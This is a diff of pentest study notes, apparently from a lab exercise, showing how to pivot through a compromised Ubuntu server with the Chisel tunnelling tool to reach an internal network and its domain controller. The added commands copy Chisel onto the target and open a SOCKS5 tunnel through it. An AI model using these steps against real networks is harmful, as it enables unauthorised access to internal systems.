@@ -1,2 +1,29 @@
 **Overview:**
-[Chisel](https://github.com/jpillora/chisel) is a TCP/UDP-based tunneling tool written in [Go](https://go.dev/) that uses HTTP to transport data that is secured using SSH. `Chisel` can create a client-server tunnel connection in a firewall restricted environment. Let us consider a scenario where we have to tunnel our traffic to a webserver on the `172.16.5.0`/`23` network (internal network). We have the Domain Controller with the address `172.16.5.19`. This is not directly accessible to our attack host since our attack host and the domain controller belong to different network segments. However, since we have compromised the Ubuntu server, we can start a Chisel server on it that will listen on a specific port and forward our traffic to the internal network through the established tunnel.
+- [Chisel](https://github.com/jpillora/chisel) is a TCP/UDP-based tunneling tool written in Go that uses HTTP to transport data that is secured using SSH. `Chisel` can create a client-server tunnel connection in a firewall restricted environment.
+- In a scenario attackers might have to tunnel traffic to a webserver on the `172.16.5.0`/`23` network (internal network). The Domain Controller with the address `172.16.5.19`. 
+- This is not directly accessible to the attack host since attack host and the domain controller belong to different network segments. However, since an Ubuntu server has already been compromisded, it allows to start a Chisel server on it that will listen on a specific port and forward traffic to the internal network through the established tunnel.
+---
+```
+git clone https://github.com/jpillora/chisel.git
+```
+cd chisel
+go build
+```
+```
+installation 
+
+```
+scp chisel ubuntu@10.129.202.64:~/
+```
+trasnfer to target
+
+```
+./chisel server -v -p 1234 --socks5
+```
+run the server on the target host
+
+The Chisel listener will listen for incoming connections on port `1234` using SOCKS5 (`--socks5`) and forward it to all the networks that are accessible from the pivot host
+
+```
+./chisel client -v 10.129.202.64:1234 socks
+```
